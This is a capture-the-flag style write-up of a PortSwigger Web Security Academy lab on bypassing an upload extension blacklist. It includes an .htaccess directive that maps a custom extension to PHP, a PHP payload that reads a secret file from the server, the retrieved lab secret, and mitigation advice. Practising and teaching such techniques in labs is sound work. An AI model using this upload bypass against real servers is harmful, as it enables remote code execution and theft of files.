# Lab 09: Web Shell Upload via Extension Blacklist Bypass (.htaccess)

**Platform:** PortSwigger Web Security Academy
**Vulnerability Type:** Unrestricted File Upload - Extension Blacklist Bypass

### Description
The application allows file upload functionality but relies on a blacklist to block executable files. 
It fails to block `.htaccess` and `.l33t` files, allowing an attacker to override server configuration and achieve Remote Code Execution.

### Exploitation Steps

1.  Logged in to the account functionality.
2.  Created and uploaded a `.htaccess` file with the following content to map `.l33t` extension to PHP:
AddType application/x-httpd-php .l33t
3.  Created a web shell file `exploit.l33t` with payload:
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
4.Uploaded exploit.l33t via the avatar upload feature.
5.Accessed the file at /files/avatars/exploit.l33t to retrieve the secret.
6.Submitted the secret to solve the lab.

Proof of Concept

Lab09-Scretecode.png
Lab09-solved.png
Secret: fANjtZmr6DIJFTBQauwpNkIRr8cOmuCG

##Mitigation

Do not allow upload of .htaccess or server configuration files.
Use a whitelist for allowed extensions (e.g., only .jpg, .png) instead of a blacklist.
Store uploaded files outside the web root or with random filenames.
Validate file content and MIME type properly.
